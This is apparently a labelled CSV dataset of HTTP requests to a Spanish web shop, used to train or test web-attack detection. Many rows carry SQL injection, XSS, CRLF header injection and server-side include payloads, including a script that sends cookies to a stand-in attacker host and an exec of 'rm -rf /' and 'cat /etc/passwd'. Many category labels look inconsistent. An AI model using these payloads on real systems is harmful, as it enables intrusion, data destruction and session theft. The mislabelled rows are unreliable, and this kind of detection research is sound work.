payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
registro | doti | idealismo | Ian | Sacota Xech | alland.soeltoft@aridossanchez.do | 28681618C | C/ Valencia S/N 11A | Pancorbo | 26321 | Alicante | 3366384544522158 | Registrar HTTP/1.1,cmd,no,186,0,0,0,1,low
"insertar | <!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1",sql,no,71,1,1,0,1,medium
insertar | 7578 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7578 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | dhaliwal | la67t2na | Adelardo | Robirosa Aniceto | shankar@biosoftware.kr | 69235770C | C/ Fartaritx 170  | Montserrat | 10374 | Barce/?lona | 3896895400259241 | Registrar HTTP/1.1,cmd,no,192,0,0,0,1,low
"registro | hew+/s | z51er94 | Aliana | Pedraza Almendro | barkley@tecnoindomo.sj | 36793762H | C/ Asensio y Toledo 50, 13?G | Rillo | 02131 | Soria | 2979562523275482 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
"registro | frucci | z51er94 | Aliana | Pedraza Almendro | barkley@tecnoindomo.sj | 36793762H | C/ Asensio y Toledo 50, 13?G | Rillo | 02131 | Soria | 2979562523275482 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
entrarparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | morearty | 506TAD09A | on | Entrar HTTP/1.1,cmd,no,134,0,0,0,1,low
entrar | morearty | 506TAD09A | off/ | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Pasar por caja HTTP/1.1,cmd,no,88,0,0,0,1,low
insertar | 4598 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | charko | entrevenimiento | Cayetano | Papiol Garriga | ruehmann.goodrow@cajucar.bz | 75246757A | C/ Sierra Maigmo, S/N, 1?D | Villa de Ves | 09343 | Guadalajara | 1828745224462815 | Registrar""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,237,1,1,0,1,low
"registro | charko | entrevenimiento | Cayetano | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | ruehmann.goodrow@cajucar.bz | 75246757A | C/ Sierra Maigmo, S/N, 1?D | Villa de Ves | 09343 | Guadalajara | 1828745224462815 | Registrar HTTP/1.1",cmd,no,257,0,0,0,1,low
"registro | charko | entrevenimiento | Cayetano | Papiol Garriga | ruehmann.goodrow@cajucar.bz | 75246757A | Calle Ferrer i Guard*i*a, 7*  | Villa de Ves | 09343 | Guadalajara | 1828745224462815 | Registrar HTTP/1.1",cmd,no,214,0,0,0,1,low
"registro | charko | entrevenimiento | Cayetano | Papiol Garriga | ruehmann.goodrow@cajucar.bz | 75246757A | C/ Sierra Maigmo, S/N, 1?D | Villa de Ves | 09343 | Guadalajara | 1828745224462815 | Registrar HTTP/1.1",cmd,no,211,0,0,0,1,low
"registro | rayna | sA5di-3 | Rolando | Corzo | mueller@x2.com.gh'INJECTED_PARAM | 15491128F | Calle Granate, 21,  | Lahiguera | 50316 | Santa Cruz de Tenerife | 2289103302521090 | Registrar HTTP/1.1",cmd,no,198,1,0,0,1,low
"registro | rayna | sA5di-3 | Rolando | Corzo | mueller@x2.com.gh | 15491128F | Calle Granate, 21,  | Lahiguera | 0335A | Santa Cruz de Tenerife | 2289103302521090 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
"registro | rayna | sA5di-3 | Rolando | Corzo | mueller@x2.com.gh | 15491128F | Calle Granate, 21,  | Lahiguera | 50316 | Santa Cruz de Tenerife | 2289103302521090 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
entrar | rouer9 | g0r2o94 | off/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | rouer9 | g0r2o94 | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
"insertar | 5562<!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1",sql,no,80,1,1,0,1,low
insertar | 5562 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5562 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | leilah | c0855m05l13 | Rachid | Specie | tansey@cohel.tel | 85978887B | C/ Uruguay, 17,  | Sitges | 08840 | Salamanca | 2191408173155775 | Registrar HTTP/1.1",xss,no,294,1,1,0,1,low
"registro | *du'cic | c0855m05l13 | Rachid | Specie | tansey@cohel.tel | 85978887B | C/ Uruguay, 17,  | Sitges | 08840 | Salamanca | 2191408173155775 | Registrar HTTP/1.1",cmd,no,169,1,0,0,1,low
"registro | leilah | c0855m05l13 | Rachid | Specie | tansey@cohel.tel | 85978887B | C/ Uruguay, 17,  | Sitges | 08840 | Salamanca | 2191408173155775 | Registrar HTTP/1.1",cmd,no,168,0,0,0,1,low
entrar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | knowles8 | mi4lo | on | Entrar HTTP/1.1,cmd,no,100,0,0,0,1,low
entrar | %00 | mi4lo | on | Entrar HTTP/1.1,cmd,no,43,0,0,0,1,medium
entrar | +e'gner | mi4lo | on | Entrar HTTP/1.1,cmd,no,47,1,0,0,1,medium
entrar | knowles8 | mi4lo | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 943 | Confirmar| HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 943 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 943 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
entrar | oyama | chiapaany%0ASet-cookie%3A+Tamper%3D1041264011025374727 | on | Entrar HTTP/1.1,cmd,no,94,0,0,0,1,low
"entrar | oyama | chiapa | on | <SCRIPT>alert(""Paros"");</SCRIPT> HTTP/1.1",xss,no,72,1,1,0,1,medium
entrar | oyama | chiapa | on/ | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
entrar | oyama | chiapa | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
insertar | 853 | ' AND '1'='1 HTTP/1.1,cmd,no,38,1,0,0,1,medium
insertar | 853 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 853 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | schwenk | iNfINitIvO | Tarciano','0','0');waitfor delay '0:0:15';-- | Varela Pulido | strizhenova-boston@hrmsl.kh | 36249511Q | Barrio Vidal 132, 13?B | Rubite | 50160 | Zamora | 6295032148467406 | Registrar HTTP/1.1",sql,no,227,1,0,0,1,low
"registro | schwenk | iNfINitIvO | Tarciano | Varela Pulido | strizhenova-boston@hrmsl.kh | 36249511Q | Barrio Vidal 132, 13?B | Rubite | 50160 | Zamora | 6295032148467406 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
entrar | eluned | p8paH7g6 | on | Entrarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,103,0,0,0,1,low
entrar | eluned | p8paH7g6 | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertarany%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 6867 | Confirmar HTTP/1.1,cmd,no,84,0,0,0,1,low
insertar | 6867 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6867 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"1 | Queso Manchego | 39 | 59 | <!--#EXEC cmd=""ls /""--> HTTP/1.1",sql,no,63,1,1,0,1,medium
entrar | nu+nn8 | monstruosidad | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
entrar | farlie | monstruosidad | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | 4580any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Pasar por caja HTTP/1.1,cmd,no,92,0,0,0,1,low
"insertar | ','0','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1",sql,no,77,1,0,0,1,medium
insertar | 4580 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
registro | purnell | 49pu+22 | Lavinia | Preisz | carslisle@cirujanaplastica.ck | 99142820DSet-cookie%3A+Tamper%3D1041264011025374727 | Calle Santa Agueda 162 5?C | Arroyo del Ojanco | 10893 | Ciudad Real | 5833239568926901 | Registrar HTTP/1.1,cmd,no,244,0,0,0,1,low
registro | +stan+ly | 49pu+22 | Lavinia | Preisz | carslisle@cirujanaplastica.ck | 99142820D | Calle Santa Agueda 162 5?C | Arroyo del Ojanco | 10893 | Ciudad Real | 5833239568926901 | Registrar HTTP/1.1,cmd,no,203,0,0,0,1,low
%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | krishna | forca | on | Entrar HTTP/1.1,cmd,no,93,0,0,0,1,low
"entrar | krishna | reg,ulador | on | Entrar HTTP/1.1",cmd,no,52,0,0,0,1,medium
entrar | krishna | forca | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
insertar | 8360 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8360 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | al*hoRrE | off | Entrar HTTP/1.1,cmd,no,95,0,0,0,1,low
entrar | dealto | 'meLIndrEr/o | off | Entrar HTTP/1.1,cmd,no,54,1,0,0,1,medium
entrar | dealto | al*hoRrE | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 4825 | | HTTP/1.1,cmd,no,28,0,0,0,1,high
insertar | 4825 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 4825 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"entrar | cristi<!--#EXEC cmd=""ls /""--> | corac27o | on | Entrar HTTP/1.1",sql,no,72,1,1,0,1,medium
%7C | cristi | corac27o | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
entrar | cristi | corac27o | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 1859%2B | Confirmar HTTP/1.1,cmd,no,39,0,0,0,1,medium
insertar | 1859 | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,161,1,1,0,1,low
insertar | 1859 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 1859 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | aproximativo | on | Entrar HTTP/1.1,cmd,no,98,0,0,0,1,low
entrar | cavanaug | aproximativo | on | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
"2','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,46,1,0,0,1,medium
insertar | 4342 | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,cmd,no,109,0,0,0,1,low
insertar | 4342 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 4342 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | barrell | Bu70NvIl2A | Aristarco | Porflit Strick | holton@enigmatico.vu | 91802907V | C/ Hipica, 17 6?G | Robladillo | 31498 | Asturias | 2382356887659758 | Registrar HTTP/1.1",cmd,no,525,0,0,0,1,low
"registro | barrell | Bu70NvIl2A | Aristarco | Porflit Strick | holton@enigmatico.vu | 91802907V | Cal*le Colonia Militar 1*78,  | Robladillo | 31498 | Asturias | 2382356887659758 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
"registro | barrell | Bu70NvIl2A | Aristarco | Porflit Strick | holton@enigmatico.vu | 91802907V | C/ Hipica, 17 6?G | Robladillo | 31498 | Asturias | 2382356887659758 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
entrar | frasco | .ag091766so | ';waitfor delay '0:0:15';-- | Entrar HTTP/1.1,sql,no,77,1,0,0,1,medium
entrar | frasco | .ag091766so | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
1AND 1=1 HTTP/1.1,other,no,17,0,0,0,0,high
paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | 157 | Pasar por caja HTTP/1.1,cmd,no,114,0,0,0,1,low
insertar | 157 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 157 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | jdavie | CoMba82V72Ad | Ram | Pieres Marrett | anutchitcharnchai@informatica2009.ec | 76610505N | Juan Martel 18, 8?H | Buenavista del Norte | 08612 | GuadalajaraAND 1=1 | 0010509413049118 | Registrar HTTP/1.1",cmd,no,220,0,0,0,1,low
"registro | jdavie | Set-cookie%3A+Tamper%3D1041264011025374727 | Ram | Pieres Marrett | anutchitcharnchai@informatica2009.ec | 76610505N | Juan Martel 18, 8?H | Buenavista del Norte | 08612 | Guadalajara | 0010509413049118 | Registrar HTTP/1.1",cmd,no,243,0,0,0,1,low
"registro | jdavie | CoMba82V72Ad | Ram | Pieres Marrett | anutchitcharnchai@informatica2009.ec | 76610505N | Juan Martel 18, 8?H | Buenavista del Norte | 08612 | .Granada | 0010509413049118 | Registrar HTTP/1.1",cmd,no,210,0,0,0,1,low
"registro | jdavie | CoMba82V72Ad | Ram | Pieres Marrett | anutchitcharnchai@informatica2009.ec | 76610505N | Juan Martel 18, 8?H | Buenavista del Norte | 08612 | Guadalajara | 0010509413049118 | Registrar HTTP/1.1",cmd,no,213,0,0,0,1,low
entrar | dincamps | 8/ast2tano | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
"insertar"" AND ""1""=""1 | 7495 | Pasar por caja HTTP/1.1",cmd,no,53,1,0,0,1,medium
insertar | 7495 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7495 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | akhtar6 | 56s5r6sa | offSet-cookie%3A+Tamper%3D1041264011025374727 | Entrar HTTP/1.1,cmd,no,93,0,0,0,1,low
| | akhtar6 | 56s5r6sa | off | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
entrar | akhtar6 | /c2nsi004r'io | off | Entrar HTTP/1.1,cmd,no,56,1,0,0,1,medium
entrar | akhtar6 | 56s5r6sa | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 7191 | Confirmar HTTP/1.1,sql,no,100,1,0,0,1,low
insertar | 7191 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7191 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar%3F | 909 | Pasar por caja HTTP/1.1,cmd,no,43,0,0,0,1,medium
insertar | 909 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 909 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | shapiro | 1a3t14izante | Calixto | Bonas Crehuet | perepeczko@zarasalud.rw | 76410524Q | Diposit 136, 1G%00 | Guancha, La | 12214 | Granada | 2829438543802993 | Registrar HTTP/1.1",cmd,no,190,0,0,0,1,low
"registro | shapiro | un,tar | Calixto | Bonas Crehuet | perepeczko@zarasalud.rw | 76410524Q | Diposit 136, 1G | Guancha, La | 12214 | Granada | 2829438543802993 | Registrar HTTP/1.1",cmd,no,181,0,0,0,1,low
"registro | shapiro | 1a3t14izante | Calixto | Bonas Crehuet | perepeczko@zarasalud.rw | 76410524Q | Diposit 136, 1G | Guancha, La | 12214 | Granada | 2829438543802993 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
"entrar<!--#EXEC cmd=""ls /""--> | edik3 | a6mi9a2 | on | Entrar HTTP/1.1",sql,no,70,1,1,0,1,medium
entrar | edik3 | a6mi9a2 | on/ | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
entrar | edik3 | a6mi9a2 | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
insertar | 3565 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
"registro | watchorn | gin09r9n3 | Alcira | Marcapura Pachecote | wolheim@soyrojo.se | 79531407Y | ','0');waitfor delay '0:0:15';-- | Deleitosa | 49410 | Baleares (Illes) | 4881993166167995 | Registrar HTTP/1.1",sql,no,209,1,0,0,1,low
"registro | watchorn | gin09r9n3 | Alcira | Marcapura Pachecote | wolheim@soyrojo.se | 79531407Y | Calle La Gran*ja, +150, 1?C | Deleitosa | 49410 | Baleares (Illes) | 4881993166167995 | Registrar HTTP/1.1",cmd,no,204,0,0,0,1,low
"registro | watchorn | gin09r9n3 | Alcira | Marcapura Pachecote | wolheim@soyrojo.se | 79531407Y | Calle Luxemburgo, 139, 4?H | Deleitosa | 49410 | Baleares (Illes) | 4881993166167995 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
entrar? | suh9 | 4ar9ues4a | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | eli+s*/a | 4ar9ues4a | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | suh9 | 4ar9ues4a | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 6714 | ConfirmarAND 1=1 HTTP/1.1,cmd,no,43,0,0,0,1,medium
insertar | 6714 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 6714 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | derenzo | estarcido | Abercio | Villatty Folk | natheaux@ofertasrusas.mt | 57150463V'INJECTED_PARAM | Vereda Del Altozano, 41, 1?G | Hontecillas | 16807 | Burgos | 3507828300066763 | Registrar HTTP/1.1",cmd,no,212,1,0,0,1,low
"registro | derenzo | 4il,+la | Abercio | Villatty Folk | natheaux@ofertasrusas.mt | 57150463V | Vereda Del Altozano, 41, 1?G | Hontecillas | 16807 | Burgos | 3507828300066763 | Registrar HTTP/1.1",cmd,no,195,0,0,0,1,low
"registro | derenzo | estarcido | Abercio | Villatty Folk | natheaux@ofertasrusas.mt | 57150463V | Vereda Del Altozano, 41, 1?G | Hontecillas | 16807 | Burgos | 3507828300066763 | Registrar HTTP/1.1",cmd,no,197,0,0,0,1,low
%7C | mcnally | laCtesCente | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
"entrar | mcnally | entr,onera,r | on | Entrar HTTP/1.1",cmd,no,54,0,0,0,1,medium
entrar | mcnally | laCtesCente | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
insertarparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | 8145 | Confirmar HTTP/1.1,cmd,no,118,0,0,0,1,low
insertar | 8145 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8145 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | ramos | imperceptiblemenTE | Albana | Giorgis Zabala | mobley_bonn@delujos.cv | 76097661E | Calle 12 56  | Majaelrayo | 48220 | Vizcaya | 805212306238877 | Registrar HTTP/1.1,cmd,no,185,0,0,0,1,low
registro | ramos | imperceptiblemenTE | Albana | Giorgis Zabala | mobley_bonn@delujos.cv | 76097661E | Calle 12 56  | Majaelrayo | 48220 | Vizcaya | 5189679108222832 | Registrar HTTP/1.1,cmd,no,186,0,0,0,1,low
entrar | temp | tel7tipo%3F | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
"entrar | poi,ndex*t | tel7tipo | off | Entrar HTTP/1.1",cmd,no,54,0,0,0,1,medium
entrar | temp | tel7tipo | off | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 623 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 623 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
entrar | stouder' AND '1'='1 | ti064ga | on | Entrar HTTP/1.1,cmd,no,61,1,0,0,1,medium
entrar | stouder | orea/nt/e | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | stouder | ti064ga | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
1any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,64,0,0,0,0,medium
"insertar | 8896','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1",sql,no,72,1,0,0,1,medium
insertar | 8896 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8896 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | gamaleld | t54p-4l | Shunko | Volta Piriz | guarneros@elfisioencasa.eu | 78789686N | Menorca 13, 2?H | Villagonzalo','0','0','0','0');waitfor delay '0:0:15';-- | 31495 | Granada | 4253253341921904 | Registrar HTTP/1.1",sql,no,228,1,0,0,1,low
"registro | gamaleld | | | Shunko | Volta Piriz | guarneros@elfisioencasa.eu | 78789686N | Menorca 13, 2?H | Villagonzalo | 31495 | Granada | 4253253341921904 | Registrar HTTP/1.1",cmd,no,178,0,0,0,1,low
"registro | gamaleld | t54p-4l | Shunko | Volta Piriz | st@reep@accesoa@bierto.@qa | 78789686N | Menorca 13, 2?H | Villagonzalo | 31495 | Granada | 4253253341921904 | Registrar HTTP/1.1",cmd,no,184,0,0,0,1,low
"registro | gamaleld | t54p-4l | Shunko | Volta Piriz | guarneros@elfisioencasa.eu | 78789686N | Menorca 13, 2?H | Villagonzalo | 31495 | Granada | 4253253341921904 | Registrar HTTP/1.1",cmd,no,184,0,0,0,1,low
2 | Queso Manchego | 39 | 76 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,sql,no,104,1,0,0,1,low
entrar | mtl%00 | r22camien5+9 | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
entrar | mtl | r22camien5+9 | on/ | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | mtl | r22camien5+9 | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 5059 | Confirmar HTTP/1.1,cmd,no,79,0,0,0,1,medium
insertar | 5059 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5059 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrarany%0ASet-cookie%3A+Tamper%3D1041264011025374727 | cadtools | hirco | on | Entrar HTTP/1.1,cmd,no,96,0,0,0,1,low
entrar | cadtools | 'OR'a='a | on | Entrar HTTP/1.1,cmd,no,51,1,0,0,1,medium
entrar | cadtools | hirco | on/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
entrar | cadtools | hirco | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 4110 | Confirmarsessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,170,1,1,0,1,low
insertar | 4110 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 4110 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | marv| | meitad | off | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
"entrar | marv | ,e40al'F3c/23se | off | Entrar HTTP/1.1",cmd,no,55,1,0,0,1,medium
entrar | marv | meitad | off | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
"insertar | 6071<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Confirmar HTTP/1.1",sql,no,80,1,1,0,1,low
insertar | 6071 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6071 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro@40 | tech4 | mosqui-tero | Rendor | Sennacherribbo Castelan | peake@devuelos.mx | 32201886T | Carretera General De La Laguna, 39 3?D | Aldeanueva del Camino | 09143 | Segovia | 8941990711802525 | Registrar HTTP/1.1",cmd,no,223,0,0,0,1,low
"registro | tech4 | mosqui-tero | Rendor | Sennacherribbo Castelan | peake@devuelos.mx | 32201886T | Carretera General De La Laguna, 39 3?D | Aldeanueva del Camino | 09143 | Segovia | 509189133497597A | Registrar HTTP/1.1",cmd,no,220,0,0,0,1,low
"registro | tech4 | mosqui-tero | Rendor | Sennacherribbo Castelan | peake@devuelos.mx | 32201886T | Carretera General De La Laguna, 39 3?D | Aldeanueva del Camino | 09143 | Segovia | 8941990711802525 | Registrar HTTP/1.1",cmd,no,220,0,0,0,1,low
"registro | jock | exorcismo | Modesto | Oms Berdasquera | banas_chwalibog@soybueno.st | 33293484H | C/ Reina, 132 4G | Cevico Navero | 50294 | Salamanca | 3614479756517146 | Registrar HTTP/1.1",cmd,no,192,0,0,0,1,low
entrar | mobley | r10bo9b7 | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1,sql,no,75,1,0,0,1,medium
entrar | mobley | r10bo9b7 | on/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | mobley | r10bo9b7 | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
1%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,encoded attack,no,62,0,0,0,0,medium
insertar | 1331 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1331 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | nerby5 | te6b8anTe | Rosarito | Millan Guiral | goldsborough4@sevach.name | 47183982B | C/ Jardins Dels Gegants De Gracia 143, 11-H | Melgar de Abajo | 06228 | ');waitfor delay '0:0:15';-- | 9926995556034564 | Registrar HTTP/1.1",sql,no,239,1,0,0,1,low
"registro | nerby5 | te6b8anTe | Rosarito | Millan Guiral | goldsborough4@sevach.name | 47183982B | C/ Jardins Dels Gegants De Gracia 143, 11-H | Melgar de Abajo | 06228 | Valladolid | 9926995556034564 | Registrar HTTP/1.1",cmd,no,221,0,0,0,1,low
entrar | hattiany%0ASet-cookie%3A+Tamper%3D1041264011025374727 | centilitro | off | Entrar HTTP/1.1,cmd,no,99,0,0,0,1,low
entrar | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | centilitro | off | Entrar HTTP/1.1,cmd,no,98,0,0,0,1,low
entrar | hatti | centilitro | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
